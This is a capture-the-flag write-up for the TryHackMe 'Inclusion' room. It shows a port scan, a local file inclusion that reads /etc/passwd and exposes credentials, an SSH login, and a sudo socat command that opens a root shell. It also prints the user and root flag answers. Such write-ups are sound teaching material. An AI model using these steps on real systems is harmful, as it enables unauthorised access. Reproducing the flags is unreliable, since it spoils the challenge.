# Inclusion

A beginner level LFI challenge

Room URL: https://tryhackme.com/room/inclusion

---

# Task 1

1. Deploy the machine and start enumerating

It seems there's two open ports

```
Nmap scan report for 10.10.233.27
Host is up (0.080s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e6:3a:2e:37:2b:35:fb:47:ca:90:30:d2:14:1c:6c:50 (RSA)
|   256 73:1d:17:93:80:31:4f:8a:d5:71:cb:ba:70:63:38:04 (ECDSA)
|_  256 d3:52:31:e8:78:1b:a6:84:db:9b:23:86:f0:1f:31:2a (ED25519)
80/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)
|_http-server-header: Werkzeug/0.16.0 Python/3.6.9
|_http-title: My blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

It seems the webserver is hosting some PHP script that has a GET parameter of
`name`:
```
http://10.10.233.27/article?name=lfiattack
http://10.10.233.27/article?name=hacking
http://10.10.233.27/article?name=rfiattack
```

The `lfihcaking` and `rfihacking` pages actually give some good tips on what you
can try.

We've found `/etc/passwd` by using LFI and it seems it has credentials commented
out in there. Let's use those to enter the box.

No answer needed.

# Task 2

1. user flag

```bash
$ ssh falconfeast@10.10.233.27
falconfeast@10.10.233.27's password:
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-74-generic x86_64)
Last login: Thu Jan 23 18:41:39 2020 from 192.168.1.107
falconfeast@inclusion:~$ ls
articles  user.txt
falconfeast@inclusion:~$ cat user.txt
60989655118397345799
```


```
60989655118397345799
```

2. root flag

`sudo -l` shows we can run `/usr/bin/socat` as root without password

```bash
falconfeast@inclusion:~$ sudo -l
Matching Defaults entries for falconfeast on inclusion:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User falconfeast may run the following commands on inclusion:
    (root) NOPASSWD: /usr/bin/socat
```

[gtfobins](https://gtfobins.github.io/gtfobins/socat/) has great examples on how
we can use `socat` to escalate privileges.

```
falconfeast@inclusion:~$ sudo /usr/bin/socat stdin exec:/bin/sh
id
uid=0(root) gid=0(root) groups=0(root)
```

Now that we have root we only need to extract the root flag.

```bash
ls /root
root.txt
cat /root/root.txt
42964104845495153909
```

```
42964104845495153909
```
